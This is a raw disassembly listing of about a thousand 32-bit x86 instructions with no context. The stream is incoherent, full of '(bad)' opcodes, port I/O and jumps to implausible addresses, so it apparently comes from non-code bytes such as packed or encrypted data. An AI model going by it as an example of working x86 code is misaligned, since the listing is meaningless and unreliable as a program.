  41ba2e:	mov    bh,0x43
  41ba30:	out    0xc9,eax
  41ba32:	pop    edi
  41ba33:	adc    BYTE PTR [ebx-0x1d],bl
  41ba36:	retf   0x58e3
  41ba39:	mov    ecx,0x90197428
  41ba3e:	push   esp
  41ba3f:	inc    ecx
  41ba40:	xchg   edi,eax
  41ba41:	push   ecx
  41ba42:	mov    al,0xee
  41ba44:	sbb    eax,0x865298b5
  41ba49:	imul   edx,DWORD PTR [ebx],0x72
  41ba4c:	mov    edx,0x5e048a2c
  41ba51:	imul   esi,DWORD PTR [esi-0x57e359f7],0x7ed44df4
  41ba5b:	pcmpgtd mm6,QWORD PTR [ecx+eiz*1]
  41ba5f:	jl     0x41ba40
  41ba61:	add    DWORD PTR [ebx],edi
  41ba63:	jo     0x41baa2
  41ba65:	xchg   esi,eax
  41ba66:	sbb    eax,DWORD PTR [edx-0x7e]
  41ba69:	jmp    0xcc325368
  41ba6e:	jl     0x41b9fd
  41ba70:	int    0x19
  41ba72:	lock test al,0x1d
  41ba75:	add    DWORD PTR [ebp-0x36],eax
  41ba78:	and    eax,0x8a073f17
  41ba7d:	pop    es
  41ba7e:	lods   eax,DWORD PTR ds:[esi]
  41ba7f:	in     eax,dx
  41ba80:	cdq    
  41ba81:	scas   eax,DWORD PTR es:[edi]
  41ba82:	test   BYTE PTR [eax+edx*8],dh
  41ba85:	inc    edi
  41ba86:	push   ecx
  41ba87:	test   DWORD PTR [esi],0x28ccbd4d
  41ba8d:	mov    esi,0x45f60a33
  41ba92:	int    0x24
  41ba94:	retf   
  41ba95:	dec    ebx
  41ba96:	popa   
  41ba97:	in     al,dx
  41ba98:	jmp    0x41baf5
  41ba9a:	jbe    0x41bac2
  41ba9c:	adc    ecx,DWORD PTR [edi-0x24c87ff1]
  41baa2:	je     0x41baed
  41baa4:	arpl   WORD PTR [eax+0x87f7709],sp
  41baaa:	mov    esi,0x6500db1e
  41baaf:	pcmpgtw mm1,QWORD PTR [edx]
  41bab2:	xchg   ecx,eax
  41bab3:	pop    ebp
  41bab4:	loop   0x41ba86
  41bab6:	push   ebp
  41bab7:	xlat   BYTE PTR ds:[ebx]
  41bab8:	inc    eax
  41bab9:	pop    edx
  41baba:	add    DWORD PTR [ecx],ebx
  41babc:	cwde   
  41babd:	jae    0x41bb39
  41babf:	pop    ds
  41bac0:	xchg   esi,eax
  41bac1:	outs   dx,BYTE PTR ds:[esi]
  41bac2:	push   esi
  41bac3:	cdq    
  41bac4:	popa   
  41bac5:	sbb    DWORD PTR [edi+0x45],ecx
  41bac8:	cmp    edx,eax
  41baca:	in     al,dx
  41bacb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bacc:	adc    edi,DWORD PTR [edx-0x6b]
  41bacf:	scas   al,BYTE PTR es:[edi]
  41bad0:	(bad)  
  41bad2:	rcr    DWORD PTR ds:0xe000cfaf,1
  41bad8:	ins    WORD PTR es:[edi],dx
  41bada:	ret    
  41badb:	jne    0x41baae
  41badd:	outs   dx,BYTE PTR ds:[esi]
  41bade:	dec    eax
  41badf:	test   dl,bl
  41bae1:	leave  
  41bae2:	xchg   esi,eax
  41bae3:	int3   
  41bae4:	xor    cl,BYTE PTR [esi+esi*4+0xf508643]
  41baeb:	mov    ch,0xc2
  41baed:	adc    DWORD PTR [ecx+0x73],ecx
  41baf0:	ja     0x41ba9c
  41baf2:	vpunpcklwd ymm6,ymm6,YMMWORD PTR [ebp-0x3]
  41baf7:	fcomp  QWORD PTR [edx-0x4b8344a6]
  41bafd:	sub    ah,bl
  41baff:	call   0xbf03:0x6b715a06
  41bb06:	sub    al,0xb1
  41bb08:	add    ecx,ebx
  41bb0a:	adc    al,0xfe
  41bb0c:	mov    ds:0x460d7fe2,al
  41bb11:	mov    WORD PTR [edx-0x5a85052e],ds
  41bb17:	pop    ss
  41bb18:	and    ah,BYTE PTR [edi]
  41bb1a:	sub    BYTE PTR [esi],ah
  41bb1c:	add    bh,bh
  41bb1e:	fadd   QWORD PTR [edi]
  41bb20:	rcr    BYTE PTR [esi+0x22],cl
  41bb23:	test   BYTE PTR [esi-0x7f3ff1b2],0x88
  41bb2a:	add    BYTE PTR [edx+0xf],dl
  41bb2d:	loope  0x41bb39
  41bb2f:	dec    esi
  41bb30:	dec    ecx
  41bb31:	jmp    0xbe01475f
  41bb36:	fs mov esi,0xab28cb4e
  41bb3c:	push   0x2acc890b
  41bb41:	xor    eax,0xf16392d0
  41bb46:	jge    0x41bb1c
  41bb48:	pop    esp
  41bb49:	mov    cl,0x4a
  41bb4b:	popf   
  41bb4c:	int3   
  41bb4d:	jns    0x41bb40
  41bb4f:	hlt    
  41bb50:	fldcw  WORD PTR [ebx-0x51]
  41bb53:	(bad)  
  41bb54:	xchg   esp,eax
  41bb55:	or     eax,0xaddeee8d
  41bb5a:	mov    ch,0xf4
  41bb5c:	int    0xb0
  41bb5e:	ficomp WORD PTR [eax-0x57b669aa]
  41bb64:	call   0xcb617083
  41bb69:	xchg   edx,eax
  41bb6a:	mov    ebx,0xa2403373
  41bb6f:	or     ah,dh
  41bb71:	cmp    ebx,ebx
  41bb73:	cmp    eax,0x35d10cdb
  41bb78:	sub    esi,DWORD PTR [edx-0x2b]
  41bb7b:	cld    
  41bb7c:	mov    bh,0xe3
  41bb7e:	xchg   edi,eax
  41bb7f:	xchg   ecx,eax
  41bb80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb81:	push   esi
  41bb82:	push   es
  41bb83:	jl     0x41bb14
  41bb85:	push   edx
  41bb87:	(bad)  
  41bb88:	outs   dx,DWORD PTR ds:[esi]
  41bb89:	add    al,0x31
  41bb8b:	sahf   
  41bb8c:	xor    dh,BYTE PTR [ecx+0x7]
  41bb8f:	mov    bh,0xa7
  41bb91:	dec    esi
  41bb92:	xchg   esp,eax
  41bb93:	mov    ebp,0x40ed4b9
  41bb98:	aad    0x78
  41bb9a:	mov    al,0xe
  41bb9c:	icebp  
  41bb9d:	mov    esi,0x148644
  41bba2:	repz adc esp,DWORD PTR [edi]
  41bba5:	push   esi
  41bba6:	pusha  
  41bba7:	inc    esi
  41bba8:	jl     0x41bbac
  41bbaa:	mov    cl,0xf7
  41bbac:	sbb    BYTE PTR [ecx+0x549e8958],dh
  41bbb2:	mov    ebp,0x511c14a3
  41bbb7:	imul   esp,DWORD PTR [edi+0x40],0x34
  41bbbb:	stc    
  41bbbc:	aad    0xce
  41bbbe:	nop
  41bbbf:	aad    0x6a
  41bbc1:	sbb    DWORD PTR [ebx],esi
  41bbc3:	sub    DWORD PTR [ebx-0x6987627d],0x4a
  41bbca:	fucom  st(4)
  41bbcc:	jb     0x41bb56
  41bbce:	fidivr DWORD PTR [edx+ebx*8-0x69]
  41bbd2:	ss leave 
  41bbd4:	inc    ecx
  41bbd5:	xchg   esp,eax
  41bbd6:	mov    dl,0x34
  41bbd8:	fmul   QWORD PTR [edi+0x7e9b0e79]
  41bbde:	dec    esp
  41bbdf:	js     0x41bbe4
  41bbe1:	shl    BYTE PTR [edi-0x5f],cl
  41bbe4:	pushf  
  41bbe5:	pop    si
  41bbe7:	jl     0x41bbf3
  41bbe9:	call   0x20d7187f
  41bbee:	out    0x1,al
  41bbf0:	mov    ecx,0xc838522b
  41bbf5:	fstp   TBYTE PTR [ecx+0x5456aafb]
  41bbfb:	js     0x41bc00
  41bbfd:	iret   
  41bbfe:	clc    
  41bbff:	inc    ebx
  41bc00:	arpl   ax,si
  41bc02:	inc    ebp
  41bc03:	and    al,0x17
  41bc05:	jnp    0x41bc07
  41bc07:	push   edx
  41bc08:	lock fdivr DWORD PTR [edx+0x2]
  41bc0c:	xchg   BYTE PTR [eax],cl
  41bc0e:	inc    ecx
  41bc0f:	xor    eax,0x70840ab
  41bc14:	stos   DWORD PTR es:[edi],eax
  41bc15:	add    edi,ebx
  41bc17:	dec    edi
  41bc18:	xchg   esp,eax
  41bc19:	call   0xb231:0xa576ff64
  41bc20:	jmp    0x41bc42
  41bc22:	inc    esp
  41bc23:	xchg   edi,eax
  41bc24:	pop    ecx
  41bc25:	test   BYTE PTR [esi+0x6f],cl
  41bc28:	xchg   edi,eax
  41bc29:	dec    edx
  41bc2a:	loopne 0x41bbcd
  41bc2c:	out    dx,eax
  41bc2d:	push   edi
  41bc2e:	jno    0x41bc48
  41bc30:	jge    0x41bc62
  41bc32:	std    
  41bc33:	jno    0x41bc01
  41bc35:	add    ebp,ebx
  41bc37:	inc    esi
  41bc38:	sub    eax,0x3f985495
  41bc3d:	mov    ebx,0xe8f4562b
  41bc42:	(bad)  
  41bc44:	pusha  
  41bc45:	les    ebx,FWORD PTR [ebx]
  41bc47:	fstp   DWORD PTR [esi+0x6f0fc5e0]
  41bc4d:	add    bl,cl
  41bc4f:	js     0x41bbd7
  41bc51:	mov    esp,gs
  41bc53:	jno    0x41bcad
  41bc55:	and    esp,DWORD PTR [edi]
  41bc57:	pop    ecx
  41bc58:	test   BYTE PTR [eax],dl
  41bc5a:	test   al,0x39
  41bc5c:	pop    esp
  41bc5d:	fidivr WORD PTR [edi+0x43ef6171]
  41bc63:	shl    ebx,cl
  41bc65:	jmp    0xf78db971
  41bc6a:	call   0xd4ad:0x54ae495b
  41bc71:	jecxz  0x41bc19
  41bc73:	xor    DWORD PTR [ecx+0x726285ad],ebp
  41bc79:	pop    edx
  41bc7a:	ins    DWORD PTR es:[edi],dx
  41bc7b:	mov    ?,WORD PTR [ebp+0x160ce8cb]
  41bc81:	xchg   esi,eax
  41bc82:	add    bh,BYTE PTR [esp+ebx*2]
  41bc85:	xor    eax,0xdc1fef34
  41bc8a:	push   ebx
  41bc8b:	fs ins DWORD PTR es:[edi],dx
  41bc8d:	mov    edx,0xb23c0a3d
  41bc92:	(bad)  
  41bc93:	cmp    ch,BYTE PTR [edx-0x35]
  41bc96:	inc    ebp
  41bc97:	push   eax
  41bc98:	dec    ebp
  41bc99:	sub    dh,bh
  41bc9b:	pop    edi
  41bc9c:	dec    eax
  41bc9d:	repz pop ds
  41bc9f:	push   edi
  41bca0:	jbe    0x41bc95
  41bca2:	jno    0x41bce3
  41bca4:	scas   eax,DWORD PTR es:[edi]
  41bca5:	sub    DWORD PTR [esi+0x74ece623],esp
  41bcab:	push   esi
  41bcac:	jnp    0x41bcb3
  41bcae:	into   
  41bcaf:	adc    al,0xd1
  41bcb1:	mov    dl,0x48
  41bcb3:	out    0xfa,eax
  41bcb5:	sbb    eax,0xa767e3a8
  41bcba:	jle    0x41bcdd
  41bcbc:	repz dec ecx
  41bcbe:	pop    edx
  41bcbf:	dec    eax
  41bcc0:	popf   
  41bcc1:	sub    al,0x3e
  41bcc3:	sub    ch,BYTE PTR [ebx-0x17ff23a]
  41bcc9:	sbb    eax,0xe8b2bee5
  41bcce:	inc    eax
  41bccf:	ror    DWORD PTR [edi],cl
  41bcd1:	push   ecx
  41bcd2:	popa   
  41bcd3:	out    0xa7,al
  41bcd5:	jecxz  0x41bc63
  41bcd7:	or     al,BYTE PTR [ebx+0x34]
  41bcda:	sub    BYTE PTR [edx+0x6d],bl
  41bcdd:	inc    BYTE PTR [eax+0x7cafcf48]
  41bce3:	clc    
  41bce4:	(bad)  
  41bce5:	and    BYTE PTR [ebx*1-0x6c148711],cl
  41bcec:	and    eax,0x450bb8a8
  41bcf1:	enter  0x2b7e,0xe2
  41bcf5:	(bad)  
  41bcf6:	mov    al,ds:0xcb05548c
  41bcfb:	jnp    0x41bc9f
  41bcfd:	ret    0x97dd
  41bd00:	push   ebp
  41bd01:	cmp    eax,0xc1d5fd1d
  41bd06:	jnp    0x41bd5b
  41bd08:	cli    
  41bd09:	jl     0x41bc8f
  41bd0b:	xchg   ebx,eax
  41bd0c:	into   
  41bd0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd0e:	sahf   
  41bd0f:	dec    esp
  41bd10:	inc    edx
  41bd11:	fistp  QWORD PTR [edx+0x17]
  41bd14:	jmp    0x2f6de803
  41bd19:	push   esi
  41bd1a:	mov    al,ds:0x2947b96d
  41bd1f:	cli    
  41bd20:	daa    
  41bd21:	inc    edx
  41bd22:	push   ecx
  41bd23:	inc    esi
  41bd24:	stc    
  41bd25:	shr    BYTE PTR [ebp+0x15161345],cl
  41bd2b:	mov    al,ds:0x8abbdb2f
  41bd30:	fld    DWORD PTR [edi+0x7d6108ef]
  41bd36:	jb     0x41bd3c
  41bd38:	lea    ebx,[ecx]
  41bd3a:	xchg   ecx,eax
  41bd3b:	inc    ebx
  41bd3c:	push   cs
  41bd3d:	jae    0x41bcde
  41bd3f:	lahf   
  41bd40:	ins    BYTE PTR es:[edi],dx
  41bd41:	retf   0x1945
  41bd44:	scas   al,BYTE PTR es:[edi]
  41bd45:	push   eax
  41bd46:	(bad)  
  41bd47:	fisubr DWORD PTR [ebx+0x6d20e667]
  41bd4d:	hlt    
  41bd4e:	fld    QWORD PTR [ebp+0x8da5481]
  41bd54:	lods   al,BYTE PTR ds:[esi]
  41bd55:	aad    0x70
  41bd57:	and    DWORD PTR [ebx+0x2fb2cbf2],ebp
  41bd5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd5e:	fstp   QWORD PTR [edi]
  41bd60:	mov    al,0x3f
  41bd62:	mov    ds:0x8fbffeaa,eax
  41bd67:	jecxz  0x41bd45
  41bd69:	xchg   DWORD PTR [edx+0x70],esi
  41bd6c:	cmp    eax,0x3fa2772
  41bd71:	pop    esp
  41bd72:	sub    edx,DWORD PTR [ecx]
  41bd74:	mov    al,0x20
  41bd76:	dec    edx
  41bd77:	mov    DWORD PTR [edi+ecx*8-0x60c0017e],esi
  41bd7e:	(bad)  
  41bd7f:	and    DWORD PTR [edi],esi
  41bd81:	loop   0x41bd94
  41bd83:	cld    
  41bd84:	or     BYTE PTR [esi+0x6c],ch
  41bd87:	std    
  41bd88:	addr16 (bad) 
  41bd8a:	(bad)  
  41bd8b:	stc    
  41bd8c:	in     al,dx
  41bd8d:	(bad)  
  41bd8e:	dec    esi
  41bd8f:	mov    ebp,0x5994a84
  41bd94:	cmp    eax,0xb708b1a4
  41bd99:	mov    dh,BYTE PTR [eax-0x5d04c08a]
  41bd9f:	inc    ecx
  41bda0:	(bad)  
  41bda1:	in     al,dx
  41bda2:	cmp    DWORD PTR [esi-0x71077bdf],edi
  41bda8:	icebp  
  41bda9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdaa:	mov    ah,0x7e
  41bdac:	les    ebx,FWORD PTR [esi-0x4144069d]
  41bdb2:	cmp    bl,BYTE PTR [edx]
  41bdb4:	mov    WORD PTR [ecx],cs
  41bdb6:	test   DWORD PTR [edi],0x8ebb67b8
  41bdbc:	or     eax,0x7aa1a9fe
  41bdc1:	aas    
  41bdc2:	xchg   ecx,eax
  41bdc3:	ins    DWORD PTR es:[di],dx
  41bdc5:	pop    ebx
  41bdc6:	clc    
  41bdc7:	fstp   QWORD PTR [edx-0x31]
  41bdca:	xchg   esp,eax
  41bdcb:	in     al,dx
  41bdcc:	mov    bh,BYTE PTR [esi+0x5b]
  41bdcf:	fwait
  41bdd0:	loope  0x41bdd5
  41bdd2:	leave  
  41bdd3:	daa    
  41bdd4:	xor    BYTE PTR [ecx+0x3d],bh
  41bdd7:	inc    ebx
  41bdd8:	repz jo 0x41bde6
  41bddb:	jecxz  0x41bdbc
  41bddd:	mov    esp,0x2bf5be56
  41bde2:	push   ss
  41bde3:	fwait
  41bde4:	neg    DWORD PTR [edx+0x4c]
  41bde7:	xchg   BYTE PTR [edi+0x2],dl
  41bdea:	out    0xa3,eax
  41bdec:	pop    eax
  41bded:	sub    DWORD PTR [ecx-0x38],ebp
  41bdf0:	jmp    0x41bdb7
  41bdf2:	xor    eax,DWORD PTR [edi]
  41bdf4:	dec    ebp
  41bdf5:	dec    edi
  41bdf6:	sbb    al,0x83
  41bdf8:	mov    esp,0x1405416c
  41bdfd:	mov    BYTE PTR [ebp+ebp*1+0x61],ch
  41be01:	push   0xd676d2ff
  41be06:	and    eax,0x99c1e7fc
  41be0b:	fsub   DWORD PTR [edx]
  41be0d:	xor    al,0x24
  41be0f:	leave  
  41be10:	push   ds
  41be11:	push   ds
  41be12:	sub    al,0xb2
  41be14:	xchg   ecx,eax
  41be15:	outs   dx,BYTE PTR ds:[esi]
  41be16:	xchg   ebp,eax
  41be17:	inc    edx
  41be18:	sub    eax,0x753817eb
  41be1d:	cmp    BYTE PTR [edi+0x55],dl
  41be20:	rcl    DWORD PTR [esi-0x4a],cl
  41be23:	pop    ds
  41be24:	jbe    0x41be64
  41be26:	push   ss
  41be27:	fidiv  DWORD PTR [edx+0x76]
  41be2a:	adc    DWORD PTR ds:0xe6c0aff7,0xffffffc4
  41be31:	aam    0x4f
  41be33:	cmp    esi,DWORD PTR [esi+0x23e4ba03]
  41be39:	lods   eax,DWORD PTR ds:[esi]
  41be3a:	cmp    DWORD PTR [ebp+edi*8+0x5d124de1],edx
  41be41:	mov    ds:0x39b2d243,al
  41be46:	(bad)  
  41be47:	nop
  41be48:	push   0xffffff8c
  41be4a:	lods   eax,DWORD PTR gs:[esi]
  41be4c:	xchg   BYTE PTR [ecx],ah
  41be4e:	adc    al,0xa3
  41be50:	xchg   ebx,eax
  41be51:	outs   dx,DWORD PTR ds:[esi]
  41be52:	xor    ah,BYTE PTR [edx-0x40bbcbe9]
  41be58:	sbb    ecx,DWORD PTR [eax]
  41be5a:	aam    0xd4
  41be5c:	xchg   ecx,eax
  41be5d:	cli    
  41be5e:	dec    ecx
  41be5f:	jmp    0x46c6:0x76ea95b7
  41be66:	mov    ss,edx
  41be68:	lds    ebx,FWORD PTR [eax]
  41be6a:	dec    ecx
  41be6b:	xchg   edx,eax
  41be6c:	xchg   ebp,eax
  41be6d:	es mov ebp,0x58cb1440
  41be73:	imul   esi,DWORD PTR [edx],0xffffff9b
  41be76:	jno    0x41be18
  41be78:	cmp    BYTE PTR [edi+0x74],ch
  41be7b:	pop    ebx
  41be7c:	mov    ch,0x36
  41be7e:	sbb    eax,0x6363804f
  41be83:	clc    
  41be84:	or     edx,DWORD PTR [ebp+0x13]
  41be87:	or     al,0x19
  41be89:	push   0x439f1f4b
  41be8e:	loop   0x41beb5
  41be90:	jne    0x41bea3
  41be92:	cmp    al,0x9d
  41be94:	rcr    BYTE PTR [esi+ebp*1+0x59b44ed8],0xc7
  41be9c:	mov    eax,DWORD PTR [edx+0x52]
  41be9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bea0:	bound  eax,QWORD PTR ss:[ecx]
  41bea3:	jns    0x41be41
  41bea5:	mov    edx,0x38302869
  41beaa:	adc    DWORD PTR [edx-0x54],esp
  41bead:	pop    edx
  41beae:	data16 gs sbb ch,bh
  41beb2:	out    0xa5,al
  41beb4:	retf   
  41beb5:	(bad)  
  41beb7:	or     eax,0x6031efdd
  41bebc:	rcr    esp,1
  41bebe:	sar    BYTE PTR [esi-0x435a1531],cl
  41bec4:	push   ss
  41bec5:	pop    esp
  41bec6:	mov    esp,0x259e49ff
  41becb:	add    ebx,eax
  41becd:	pusha  
  41bece:	aad    0xfb
  41bed0:	xor    BYTE PTR [ecx],dl
  41bed2:	outs   dx,DWORD PTR ds:[esi]
  41bed3:	push   ebx
  41bed4:	adc    al,0x34
  41bed6:	mov    bh,0xd9
  41bed8:	pop    ebp
  41bed9:	push   esi
  41beda:	inc    ecx
  41bedb:	inc    ah
  41bedd:	imul   BYTE PTR [eax+0xf09d24f]
  41bee3:	int3   
  41bee4:	xchg   ebx,ebp
  41bee6:	in     eax,dx
  41bee7:	arpl   sp,sp
  41bee9:	in     al,0xc
  41beeb:	sub    DWORD PTR [ebp-0x5b5f286c],esi
  41bef1:	fnstenv [edx+ebx*2+0x76dd9477]
  41bef8:	adc    ebp,ebp
  41befa:	fisubr DWORD PTR [ecx-0x28]
  41befd:	ins    DWORD PTR es:[edi],dx
  41befe:	rol    DWORD PTR [eax],1
  41bf00:	ret    0x286f
  41bf03:	mov    WORD PTR [eax],?
  41bf05:	pusha  
  41bf06:	mov    esp,0x34fff28a
  41bf0b:	mov    esp,0x90b846c8
  41bf10:	sub    cl,BYTE PTR [edi+ebp*4]
  41bf13:	les    ebx,FWORD PTR [ebx]
  41bf15:	gs gs fwait
  41bf18:	or     cl,BYTE PTR [ebp-0x18]
  41bf1b:	pusha  
  41bf1c:	clc    
  41bf1d:	pusha  
  41bf1e:	loopne 0x41bf3b
  41bf20:	icebp  
  41bf21:	leave  
  41bf22:	xor    ebp,DWORD PTR ds:0x47fee04
  41bf28:	std    
  41bf29:	ja     0x41bf5b
  41bf2b:	scas   al,BYTE PTR es:[edi]
  41bf2c:	dec    ebp
  41bf2d:	mov    ds,WORD PTR [eax]
  41bf2f:	fild   WORD PTR [ebx+0x23]
  41bf32:	mov    edx,DWORD PTR ds:0x9b66a1a5
  41bf38:	es aam 0x7b
  41bf3b:	stos   DWORD PTR es:[edi],eax
  41bf3c:	rcl    dl,0x5d
  41bf3f:	popa   
  41bf40:	push   ebp
  41bf41:	das    
  41bf42:	loopne 0x41bf37
  41bf44:	es mov al,0xa0
  41bf47:	pushf  
  41bf48:	or     BYTE PTR [ebx],0xa8
  41bf4b:	pop    edi
  41bf4c:	iret   
  41bf4d:	or     al,0xcf
  41bf4f:	sar    dh,0x4
  41bf52:	inc    ecx
  41bf53:	scas   al,BYTE PTR es:[edi]
  41bf54:	and    ebx,DWORD PTR [eax]
  41bf56:	rcl    BYTE PTR [edx+0x58f55fd3],cl
  41bf5c:	xlat   BYTE PTR ds:[ebx]
  41bf5d:	dec    eax
  41bf5e:	mov    dh,0x5c
  41bf60:	sub    bl,BYTE PTR [edx-0x1b9edd5d]
  41bf66:	aam    0x64
  41bf68:	or     DWORD PTR [ebx-0x52aac019],edx
  41bf6e:	inc    edi
  41bf6f:	push   ecx
  41bf70:	push   ebp
  41bf71:	or     ebx,edi
  41bf73:	or     al,0x2d
  41bf75:	scas   eax,DWORD PTR es:[edi]
  41bf76:	icebp  
  41bf77:	inc    ebp
  41bf78:	gs push ebx
  41bf7a:	cmp    esp,DWORD PTR [esi]
  41bf7c:	xchg   esp,eax
  41bf7d:	je     0x41bf51
  41bf7f:	pop    edi
  41bf80:	or     al,0x2a
  41bf82:	dec    eax
  41bf83:	xor    ah,al
  41bf85:	lods   al,BYTE PTR ds:[esi]
  41bf86:	adc    BYTE PTR [edx],cl
  41bf88:	jle    0x41bf95
  41bf8a:	jge    0x41bfea
  41bf8c:	pop    ebx
  41bf8d:	mov    esp,0x8409f32f
  41bf92:	(bad)  
  41bf93:	in     eax,0xe6
  41bf95:	mov    edi,0x3ea53353
  41bf9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf9b:	dec    ebp
  41bf9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf9d:	xchg   ecx,eax
  41bf9e:	cdq    
  41bf9f:	sbb    BYTE PTR [ebx+0x2c8498c8],ch
  41bfa5:	lds    edi,FWORD PTR [edi+0x6b]
  41bfa8:	dec    ebp
  41bfa9:	addr16 inc edi
  41bfab:	and    dl,BYTE PTR [edx+0x10]
  41bfae:	loope  0x41bf35
  41bfb0:	arpl   WORD PTR [edx-0x6867ecd2],cx
  41bfb6:	fisubr DWORD PTR [ebx+0x43]
  41bfb9:	pop    ebp
  41bfba:	or     DWORD PTR [edx-0x14af1510],ecx
  41bfc0:	retf   0xa85f
  41bfc3:	push   0xdf9f51fc
  41bfc8:	jbe    0x41bf7e
  41bfca:	sub    ch,BYTE PTR [ecx-0x6b]
  41bfcd:	cwde   
  41bfce:	dec    ebp
  41bfcf:	cmc    
  41bfd0:	add    al,0x9a
  41bfd2:	add    eax,DWORD PTR [edi+0xa]
  41bfd5:	in     eax,0x3e
  41bfd7:	(bad)  
  41bfd8:	in     eax,0x67
  41bfda:	mov    eax,ds:0xe4025e0a
  41bfdf:	pop    ebx
  41bfe0:	xchg   ebp,eax
  41bfe1:	arpl   WORD PTR [eax],bp
  41bfe3:	in     eax,0xe8
  41bfe5:	test   ecx,0x386a51bc
  41bfeb:	push   eax
  41bfec:	imul   eax,esi,0x54
  41bfef:	scas   al,BYTE PTR es:[edi]
  41bff0:	pop    esi
  41bff1:	rol    BYTE PTR [eax],1
  41bff3:	imul   ebp,DWORD PTR [ecx+0x1d],0xabb7716f
  41bffa:	or     si,di
  41bffd:	ins    DWORD PTR es:[edi],dx
  41bffe:	outs   dx,DWORD PTR ds:[esi]
  41bfff:	ss dec ebp
  41c001:	xchg   ebx,eax
  41c002:	ret    
  41c003:	xchg   ecx,eax
  41c004:	mov    ch,0x5
  41c006:	jle    0x41bf99
  41c008:	repnz int 0xb8
  41c00b:	jne    0x41c061
  41c00d:	(bad)  
  41c00e:	mov    ebx,DWORD PTR [eax]
  41c010:	or     BYTE PTR [esi-0x2ade4db0],ch
  41c016:	push   0xffffffae
  41c018:	mov    DWORD PTR [edx-0x5777d5c8],0x32bd05b1
  41c022:	push   cs
  41c023:	rol    al,0x32
  41c026:	iret   
  41c027:	jne    0x41c068
  41c029:	xchg   ebp,eax
  41c02a:	out    0xb7,al
  41c02c:	jg     0x41c027
  41c02e:	pop    ecx
  41c02f:	pusha  
  41c030:	es dec ebp
  41c032:	jmp    0x41c013
  41c034:	and    dh,BYTE PTR [ebx+0x6dd35a79]
  41c03a:	mov    esp,0x58ed4bda
  41c03f:	add    dl,BYTE PTR [ebp-0x11a2f456]
  41c045:	stc    
  41c046:	dec    ebp
  41c047:	sub    BYTE PTR [eax],bh
  41c049:	rcl    DWORD PTR [eax+0x58],1
  41c04c:	add    BYTE PTR [edi+0x1e],bh
  41c04f:	sub    BYTE PTR [ebx],dl
  41c051:	jg     0x41c09a
  41c053:	pop    esp
  41c054:	mov    edx,0xceba58c9
  41c059:	js     0x41c0af
  41c05b:	mov    bh,0x1c
  41c05d:	aam    0xf6
  41c05f:	jns    0x41c017
  41c061:	xor    ebx,DWORD PTR [edi]
  41c063:	cmp    ebx,DWORD PTR [eax+0x58a9d6d0]
  41c069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c06a:	sbb    edi,DWORD PTR [esi-0xa]
  41c06d:	or     al,dl
  41c06f:	pusha  
  41c070:	cdq    
  41c071:	imul   ecx,DWORD PTR [ecx+0x18a47b7],0x6f
  41c078:	shl    DWORD PTR [edi],cl
  41c07a:	sti    
  41c07b:	mov    dl,0x30
  41c07d:	iret   
  41c07e:	mov    bl,0x73
  41c080:	mov    eax,ds:0x338a3ab0
  41c085:	retf   0x53f0
  41c088:	mov    edi,0xe8f9e5f2
  41c08d:	or     eax,0x881b1bee
  41c092:	(bad)  
  41c093:	pop    edx
  41c094:	jle    0x41c064
  41c096:	scas   al,BYTE PTR es:[edi]
  41c097:	dec    esi
  41c098:	imul   DWORD PTR [eax+ebp*2]
  41c09b:	dec    ebp
  41c09c:	dec    eax
  41c09d:	(bad)  
  41c09e:	xor    eax,0xb9298192
  41c0a3:	aad    0x84
  41c0a5:	js     0x41c0f8
  41c0a7:	inc    edi
  41c0a8:	sub    DWORD PTR [esi+edi*1],0xfc08bc27
  41c0af:	mov    WORD PTR [esi-0x47],?
  41c0b2:	push   ds
  41c0b3:	and    bh,bh
  41c0b5:	loop   0x41c0a1
  41c0b7:	mov    ecx,0x729f6b9b
  41c0bc:	inc    ebp
  41c0bd:	and    al,0x2c
  41c0bf:	push   ebx
  41c0c0:	outs   dx,DWORD PTR ds:[esi]
  41c0c1:	repz pushf 
  41c0c3:	sti    
  41c0c4:	add    cl,BYTE PTR [esi+edi*2+0x4c0eee26]
  41c0cb:	adc    al,0x8c
  41c0cd:	push   eax
  41c0ce:	clc    
  41c0cf:	inc    eax
  41c0d0:	js     0x41c120
  41c0d2:	pop    edi
  41c0d3:	or     eax,0xe007c144
  41c0d8:	sti    
  41c0d9:	xor    bl,BYTE PTR [esi+eiz*4+0x565670cc]
  41c0e0:	cs mov ebx,0xa93a64ec
  41c0e6:	add    al,0x36
  41c0e8:	imul   ebx,DWORD PTR [ebp+0x558266d3],0xc362f6a4
  41c0f2:	or     BYTE PTR [ebp+0x50f05c84],al
  41c0f8:	push   eax
  41c0f9:	stos   BYTE PTR es:[edi],al
  41c0fa:	inc    esi
  41c0fb:	inc    edx
  41c0fc:	hlt    
  41c0fd:	(bad)  
  41c0fe:	jmp    0x41c101
  41c100:	aas    
  41c101:	mov    esi,ebp
  41c103:	mov    ds:0xa0edb786,eax
  41c108:	in     al,0x75
  41c10a:	jge    0x41c15d
  41c10c:	dec    esi
  41c10d:	out    dx,eax
  41c10e:	xchg   ch,bh
  41c110:	pop    ebx
  41c111:	adc    al,0x85
  41c113:	xchg   edx,eax
  41c114:	je     0x41c0ae
  41c116:	(bad)  
  41c117:	inc    ecx
  41c118:	pop    edi
  41c119:	sbb    eax,0x7773acf0
  41c11e:	jb     0x41c19a
  41c120:	sub    eax,0x6f8ab0e5
  41c125:	cdq    
  41c126:	xchg   ebx,eax
  41c127:	mov    eax,0x8343702b
  41c12c:	cld    
  41c12d:	(bad)  
  41c12e:	jns    0x41c148
  41c130:	push   eax
  41c131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c132:	cmp    ebx,esp
  41c134:	fsubr  DWORD PTR [edi-0x25fd2658]
  41c13a:	dec    esp
  41c13b:	enter  0x706d,0x19
  41c13f:	mov    ds:0x930a17a8,al
  41c144:	loop   0x41c19c
  41c146:	out    0x16,al
  41c148:	cmp    eax,0x2f24b86e
  41c14d:	jb     0x41c18f
  41c14f:	inc    edx
  41c150:	cli    
  41c151:	iret   
  41c152:	or     DWORD PTR [eax+0x4bb10f04],eax
